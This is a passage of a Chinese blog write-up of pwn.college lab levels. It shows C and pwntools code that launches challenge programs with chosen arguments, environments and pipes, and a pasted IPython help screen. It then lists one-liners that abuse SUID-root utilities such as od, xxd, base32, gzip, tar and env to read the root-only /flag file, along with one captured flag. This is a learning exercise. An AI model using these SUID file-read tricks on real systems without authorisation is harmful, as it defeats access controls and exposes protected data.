class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>真的是相当多, 见<a target="_blank" rel="noopener" href="https://pwn.college/modules/interaction">这里</a> </p>
<p>有个<a target="_blank" rel="noopener" href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>比较特别, 应该能用上</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote>
<p>怎么会有一百多个, 也太离谱了</p>
</blockquote>
<p>基本连接方式: ssh</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v<br></code></pre></div></td></tr></table></figure>

<p>在/challenge/[对应文件]中, 直接执行即可</p>
<ul>
<li>从远程机器复制文件:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure>

<h3 id="level-几来着"><a href="#level-几来着" class="headerlink" title="level(几来着)"></a>level(几来着)</h3><p>要求以0个环境变量运行程序, 可以使用execve函数, env命令, exec命令三种方法</p>
<blockquote>
<p>其余的大概就是加环境变量, 加参数, 写在脚本里之类的简单题</p>
</blockquote>
<h3 id="level15新东西"><a href="#level15新东西" class="headerlink" title="level15新东西"></a>level15新东西</h3><p>新的一个东西: ipython, An enhenced interactive python, 增加了一些特别的功能, 还有个说明书放在本level的末尾.</p>
<p>ssh接上后, 进入ipython, 然后Ctrl+O就可以编辑多行脚本了, 使用的还是pwntools, 算是熟悉一点.</p>
<p>有两种方法: </p>
<ol>
<li><code>!exec /challenge/embryoio_level15</code> </li>
<li>用<code>pwn.process()</code> </li>
</ol>
<h3 id="Python-–-An-enhanced-Interactive-Python"><a href="#Python-–-An-enhanced-Interactive-Python" class="headerlink" title="Python – An enhanced Interactive Python"></a>Python – An enhanced Interactive Python</h3><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p>
<p>At your system command line, type ‘ipython -h’ to see the command line<br>options available. This document only describes interactive features.</p>
<h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p>
<p>  <strong>?     -&gt; Introduction and overview of IPython’s features (this screen).</strong><br>  object?   -&gt; Details about ‘object’.<br>  object??  -&gt; More detailed, verbose information about ‘object’.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Python’s own help system.</p>
<p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p>
<h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul>
<li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type ‘help’ (no quotes) to invoke it.</p>
</li>
<li><p>Magic commands: type %magic for information on the magic subsystem.</p>
</li>
<li><p>System command aliases, via the %alias command or the configuration file(s).</p>
</li>
<li><p>Dynamic object information:</p>
<p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p>
<p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p>
<p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p>
<p>  If you just want to see an object’s docstring, type ‘%pdoc object’ (without<br>  quotes, and without % if you have automagic on).</p>
</li>
<li><p><strong>Tab completion in the local namespace:</strong> </p>
<p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if there’s<br>  no unambiguous one. It will also complete filenames in the current directory.</p>
</li>
<li><p><strong>Search previous command history in multiple ways:</strong> </p>
<ul>
<li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what you’ve typed so far.</p>
</li>
<li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what you’ve typed so far, completing as<br>  much as it can.</p>
</li>
<li><p>%hist: search history by index.</p>
</li>
</ul>
</li>
<li><p><strong>Persistent command history across sessions.</strong></p>
</li>
<li><p>Logging of input with the ability to save and restore a working session.</p>
</li>
<li><p><strong>System shell with !. Typing !ls will run ‘ls’ in the current directory.</strong></p>
</li>
<li><p>The reload command does a ‘deep’ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p>
</li>
<li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p>
</li>
<li><p>Input caching system:</p>
<p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p>
<p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p>
<p>  Additionally, global variables named _i&lt;n&gt; are dynamically created (&lt;n&gt;<br>  being the prompt counter), such that _i&lt;n&gt; == _ih[&lt;n&gt;]</p>
<p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p>
<p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p>
<p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they aren’t really valid Python code, so you can’t exec them.</p>
</li>
<li><p>Output caching system:</p>
<p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPython’s _ variables behave exactly like Mathematica’s %<br>   variables.</p>
<p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p>
<p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p>
<p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p>
</li>
<li><p><strong><mark>Directory history:</mark></strong> </p>
<p>  <strong>Your history of visited directories is kept in the global list _dh, and the</strong><br>  <strong>magic %cd command can be used to go to any entry in that list.</strong> </p>
</li>
<li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p>
<ol>
<li><p>Auto-parentheses</p>
<p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p>
<div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3
</code></pre></div>
<p> and the input will be translated to this::</p>
<div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)
</code></pre></div>
<p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p>
<p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;
</code></pre></div>
<p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p>
<div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error
</code></pre></div>
<p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work
</code></pre></div>
<p> but this will work::</p>
<div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6)
 ------&gt; zip ((1,2,3),(4,5,6))
 Out[2]= [(1, 4), (2, 5), (3, 6)]
</code></pre></div>
<p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p>
<div class="hljs code-wrapper"><pre><code> In [18]: callable list
 -------&gt; callable (list)
</code></pre></div>
</li>
<li><p><mark>Auto-Quoting</mark> </p>
<p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p>
<div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)
</code></pre></div>
<p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p>
<div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)
  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)
</code></pre></div>
<p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p>
<div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error
</code></pre></div>
</li>
</ol>
</li>
</ul>
<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>从这题开始使用这个脚本, glob可根据 Unix 终端所用规则找出所有匹配特定模式的路径名</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># 要加这一个</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure>

<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>这题检查参数argv[1]. 要注意的是pwntools的process方法以前我都是直接使用process(“file/path”), 实际上是写到了argv[]的第0个位置, 如果<code>executable(Path to the binary to execute)</code>为None, pwntools则会使用argv[0], 这就是为什么往参数里写路径就可以执行的原因.</p>
<p>写成这样即可:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure>

<h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul>
<li>18: 是环境变量, 在process的参数里加个<code>env=&#123;“balabala”=“blabla”&#125;</code>就可以了.</li>
<li>19: 是重定向stdin.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure>

<p>有一个问题: 上面的代码应该都是正确的, 但是只有再补充一句p.interactive()的时候最后两行flag才显示出来, 原因暂未知晓</p>
<ul>
<li>20: </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure>

<ul>
<li>21<br>  需要清空环境变量.<br>  注意到process这个函数中的env默认会继承python的环境变量就可以了, 必须手动清空</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure>

<h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul>
<li>22: 这部分是使用命令行执行python来执行程序的,  比较简单.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<ul>
<li>23-28: 重复一遍上面的工作, 比如0 environment, redirect stdin and out, 等等这些.</li>
</ul>
<h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>从这个开始就要编译C程序了, 29写下面这一段, 30输入一个密码.</p>
<p>值得注意的是, 如果直接调用execve, 那么会导致bash在执行.</p>
<p>如果没有waitpid, 那么子进程会被/docker/init(在我的ubuntu20.04上是/sbin/init)接管. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li><strong>31:</strong> 真的绝了, “a”原本写的是””, 父进程都不对, 过了一会儿重新编译又好了, 莫名其妙.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>32: 直接修改envp好像会出问题, 原因未知. </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//暂且先手动设置吧</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>33: 这个就是c语言版本的重定位, 还附带父进程检查的那种. 考虑到execve系列函数会直接继承原来进程的大部分属性, 比如输入输出流, 所以直接对c程序重定向即可, 子进程直接继承.</li>
<li>34: 输出重定向.</li>
</ul>
<h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul>
<li><p>35: 用脚本运行, 可以不需要fork, 直接execve</p>
</li>
<li><p>36: 输出要是到cat的PIPE, 直接在命令行里输入: <code>./c | cat</code>即可</p>
</li>
<li><p>37: <code>./c | grep -E &quot;*&quot;</code> 结束</p>
</li>
<li><p>38: <code>./c | sed &quot;=&quot;</code> </p>
</li>
<li><p>39: <code>./c  | rev | rev</code> </p>
</li>
<li><p>40: 使用管道重定向stdin, 去看了下c中的PIPE操作.暂时没有发现怎么用在这道题目上.</p>
<p><del>直接来一手三重套娃, 这样子cat就不会马上终止了</del>. md不用也可以, 是我想复杂了.</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>41: 重定向stdout. 一样做法.</li>
<li>42: <code>bash x.sh | cat</code></li>
<li>43: grep</li>
<li>44: sed</li>
<li>45: rev</li>
<li>46: 我累了</li>
</ul>
<h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure>

<h1 id="module-2-misuse"><a href="#module-2-misuse" class="headerlink" title="module 2-misuse"></a>module 2-misuse</h1><ul>
<li><p><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p>
</li>
<li></li>
</ul>
<h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>这部分的题目就是利用被设置suid的程序来以root的权限去读文件, 无论看起来是有多么的不可能.</p>
<p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p>
<ul>
<li>od: <code>od -t x8z -v -w 10 /flag</code> 硬是拼出来. </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p><code>hd /flag</code> (hexdump)</p>
</li>
<li><p><code>xxd -c60 /flag</code> 每行60个</p>
</li>
<li><p><code>base32 /flag | base32 -d</code> </p>
</li>
<li><p>split: split file into pieces. <code>split /flag</code> </p>
</li>
<li><p><code>gzip -c /flag | gzip -cd </code> </p>
</li>
<li><p>bzip2 有新的机制, 不过命令行参数和gzip非常接近</p>
</li>
<li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p>
</li>
<li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p>
</li>
<li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p>
</li>
<li><p>(23- )  cpio genisoimage: ???</p>
<ul>
<li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> 不是直接将/flag放到cpio的stdin中……他只要<u>name-list</u>……</p>
</li>
<li></li>
</ul>
</li>
<li><p>env也行?太神奇了. <code>env cat /flag</code> </p>
</li>
